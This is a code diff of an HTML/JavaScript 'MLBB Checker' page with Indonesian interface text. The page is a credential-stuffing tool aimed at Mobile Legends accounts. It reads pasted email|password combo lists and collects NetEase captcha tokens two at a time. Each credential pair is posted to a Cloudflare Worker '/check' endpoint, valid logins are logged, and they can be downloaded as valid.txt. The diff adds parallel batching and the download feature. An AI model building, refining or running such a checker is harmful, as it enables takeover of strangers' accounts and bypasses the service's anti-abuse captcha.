@@ -2,14 +2,14 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8" />
-<title>MLBB Checker 2 Captcha per Batch</title>
+<title>MLBB Checker Auto Captcha 2 per Batch</title>
 <script src="https://cstaticdun.126.net/load.min.js"></script>
 <style>
   body { font-family: Arial; max-width: 900px; margin: auto; padding: 20px; }
   textarea { width: 100%; height: 180px; font-family: monospace; }
-  #captcha-container { display: flex; gap: 20px; margin: 12px 0; }
-  .captcha-box { flex: 1; }
+  .captcha-root { margin: 12px 0; display: inline-block; vertical-align: top; }
   #log { background: #111; color: #eee; height: 300px; overflow-y: auto; padding: 10px; font-family: monospace; white-space: pre-wrap; }
+  button { padding: 10px 16px; cursor: pointer; margin-right: 8px; }
   .ok { color: #7CFC00; }
   .bad { color: #FF6B6B; }
   .info { color: #FFD866; }
@@ -17,38 +17,35 @@
 </head>
 <body>
 
-<h2>MLBB Checker 2 Captcha per Batch</h2>
-<p>Masukkan list akun (email|password atau email:password). Saat halaman dimuat, captcha langsung muncul untuk 2 akun pertama.</p>
+<h2>MLBB Checker Auto Captcha 2 per Batch</h2>
+<p>Paste list akun (email|password per baris). Proses akan otomatis meminta captcha untuk 2 akun sekaligus.</p>
 
-<textarea id="combo" placeholder="user1@example.com|Pass123\nuser2@example.com:Pass456"></textarea>
+<textarea id="combo" placeholder="user1@example.com|Pass123\nuser2@example.com|Pass456"></textarea>
+<br>
+<button id="downloadBtn">Download valid.txt</button>
 <div id="status" style="margin-top:10px;"></div>
 
 <div id="captcha-container">
-  <div class="captcha-box">
-    <h4>Captcha Akun 1</h4>
-    <div id="captcha-root-1"></div>
-  </div>
-  <div class="captcha-box">
-    <h4>Captcha Akun 2</h4>
-    <div id="captcha-root-2"></div>
-  </div>
+  <div id="captcha-root1" class="captcha-root"></div>
+  <div id="captcha-root2" class="captcha-root"></div>
 </div>
 
 <h3>Log:</h3>
 <div id="log"></div>
 
 <script>
-const CAPTCHA_ID = "fef5c67c39074e9d845f4bf579cc07af"; // ganti dengan captchaId asli
-const WORKER_URL = "https://hidayat.bonar7527.workers.dev";
+const CAPTCHA_ID = "fef5c67c39074e9d845f4bf579cc07af";
+const WORKER_URL = "https://mlbbinfo2.bonar7527.workers.dev";
 
 let combos = [];
 let currentIndex = 0;
-let validAccounts = [];
 let neCaptchaInstance1 = null;
 let neCaptchaInstance2 = null;
+let validAccounts = [];
 
 const logEl = document.getElementById("log");
 const statusEl = document.getElementById("status");
+const downloadBtn = document.getElementById("downloadBtn");
 
 function appendLog(text, cls) {
   const time = new Date().toLocaleTimeString();
@@ -68,51 +65,61 @@ function parseCombos(text) {
       const [e,p] = line.split(":",2);
       return { email: e.trim(), password: p.trim() };
     } else {
-      appendLog(`Format salah: ${line}`, "info");
+      appendLog(`Format salah dilewati: ${line}`, "info");
       return null;
     }
   }).filter(Boolean);
 }
 
-function initCaptcha(elementId) {
+function showCaptcha(rootId, instanceHolder) {
   return new Promise((resolve, reject) => {
+    const root = document.getElementById(rootId);
+    root.innerHTML = "";
+
+    if(instanceHolder.value && typeof instanceHolder.value.destroy === "function") {
+      instanceHolder.value.destroy();
+      instanceHolder.value = null;
+    }
+
     try {
       initNECaptcha({
         captchaId: CAPTCHA_ID,
-        element: elementId,
+        element: "#" + rootId,
         mode: "embed",
         width: "320px",
+        onReady() {},
         onVerify(err, data) {
-          if(err) {
-            appendLog(`Captcha error: ${JSON.stringify(err)}`, "bad");
-            reject(err);
+          if(err || !data || !data.validate) {
+            appendLog("Captcha gagal/Token kosong: " + (err ? JSON.stringify(err) : ""), "info");
+            reject(err || "no token");
             return;
           }
-          if(!data || !data.validate) {
-            appendLog("Token captcha kosong", "info");
-            reject("no token");
-            return;
+          const token = data.validate;
+          if(instanceHolder.value && typeof instanceHolder.value.destroy === "function") {
+            instanceHolder.value.destroy();
+            instanceHolder.value = null;
           }
-          resolve(data.validate);
+          resolve(token);
         },
         onLoad(instance) {
-          if(elementId.includes("1")) neCaptchaInstance1 = instance;
-          else neCaptchaInstance2 = instance;
+          instanceHolder.value = instance;
         }
       });
     } catch(e) {
+      appendLog("Gagal inisialisasi captcha: " + e, "info");
       reject(e);
     }
   });
 }
 
-async function checkOneAccount(account, token) {
-  appendLog(`Cek akun ${account.email}`, "info");
+async function checkOneAccount(account, captchaToken) {
+  appendLog(`Proses ${account.email}`, "info");
+  statusEl.textContent = `Checking ${account.email}`;
   try {
     const form = new URLSearchParams();
     form.append("email", account.email);
     form.append("password", account.password);
-    form.append("e_captcha", token);
+    form.append("e_captcha", captchaToken);
 
     const resp = await fetch(WORKER_URL + "/check", {
       method: "POST",
@@ -138,53 +145,74 @@ async function checkOneAccount(account, token) {
     } else {
       appendLog(`LAINNYA => ${account.email} | ${JSON.stringify(data)}`, "info");
     }
+
   } catch(e) {
-    appendLog(`Error cek ${account.email}: ${e}`, "bad");
+    appendLog(`Error pengecekan ${account.email}: ${e}`, "bad");
   }
 }
 
+function updateTextareaCombos() {
+  const remaining = combos.map(acc => `${acc.email}|${acc.password}`).join("\n");
+  document.getElementById("combo").value = remaining;
+}
+
 async function processBatch() {
-  if(currentIndex >= combos.length) {
-    appendLog("Selesai semua akun", "info");
+  if(combos.length === 0) {
+    appendLog("Tidak ada akun untuk dicek", "info");
     statusEl.textContent = "Selesai";
     return;
   }
 
-  const acc1 = combos[currentIndex];
-  const acc2 = combos[currentIndex+1] || null;
+  // ambil 2 akun
+  const batch = combos.splice(0,2);
+  updateTextareaCombos();
 
-  statusEl.textContent = `Batch ${Math.floor(currentIndex/2)+1}: ${acc1.email}${acc2 ? " & " + acc2.email : ""}`;
-
-  document.getElementById("captcha-root-1").innerHTML = "";
-  document.getElementById("captcha-root-2").innerHTML = "";
+  // tampilkan captcha 2 akun
+  appendLog(`Minta captcha untuk: ${batch.map(a=>a.email).join(", ")}`, "info");
 
   try {
-    const promises = [initCaptcha("#captcha-root-1")];
-    if(acc2) promises.push(initCaptcha("#captcha-root-2"));
+    const [token1, token2] = await Promise.all([
+      showCaptcha("captcha-root1", {value: neCaptchaInstance1}),
+      showCaptcha("captcha-root2", {value: neCaptchaInstance2})
+    ]);
 
-    const tokens = await Promise.all(promises);
-
-    await checkOneAccount(acc1, tokens[0]);
-    if(acc2) await checkOneAccount(acc2, tokens[1]);
+    await Promise.all([
+      checkOneAccount(batch[0], token1),
+      batch[1] ? checkOneAccount(batch[1], token2) : Promise.resolve()
+    ]);
 
   } catch(e) {
-    appendLog(`Error batch: ${e}`, "bad");
+    appendLog("Batch captcha gagal: " + e, "bad");
   }
 
-  currentIndex += acc2 ? 2 : 1;
-  setTimeout(processBatch, 500);
+  // proses batch berikutnya
+  processBatch();
 }
 
-document.addEventListener("NECaptchaReady", function() {
+function waitForNECaptcha(callback) {
+  if(window.initNECaptcha) callback();
+  else setTimeout(() => waitForNECaptcha(callback), 200);
+}
+
+waitForNECaptcha(() => {
   combos = parseCombos(document.getElementById("combo").value);
-  if(combos.length === 0) {
-    appendLog("Tidak ada akun untuk dicek", "info");
-    return;
-  }
-  appendLog(`Mulai cek ${combos.length} akun (2 per batch).`, "info");
   processBatch();
 });
-</script>
 
+// Download file valid langsung dari frontend
+downloadBtn.addEventListener("click", () => {
+  if(validAccounts.length === 0) {
+    alert("Belum ada akun valid untuk diunduh.");
+    return;
+  }
+  const blob = new Blob([validAccounts.join("\n")], { type: "text/plain" });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement("a");
+  a.href = url;
+  a.download = "valid.txt";
+  a.click();
+  URL.revokeObjectURL(url);
+});
+</script>
 </body>
 </html>
